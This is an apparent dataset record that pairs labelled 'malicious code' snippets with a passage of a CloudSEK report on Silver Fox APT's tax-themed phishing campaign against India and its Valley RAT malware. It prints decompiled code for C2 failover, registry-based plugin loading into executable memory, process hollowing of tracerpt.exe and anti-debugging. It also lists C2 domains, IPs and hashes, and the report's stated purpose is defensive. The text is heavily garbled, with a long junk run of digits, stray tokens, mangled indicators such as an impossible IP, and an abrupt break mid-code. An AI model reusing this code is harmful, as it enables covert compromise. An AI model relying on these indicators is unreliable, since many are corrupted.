config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "CreateDirectoryA(PathName,0);SetCurrentDirectoryA(PathName);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "v4 = IsDebuggerPresent();\nif (v4) {\nLogStatus((char *)&Format_2);\nreturn 0;\n}", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) 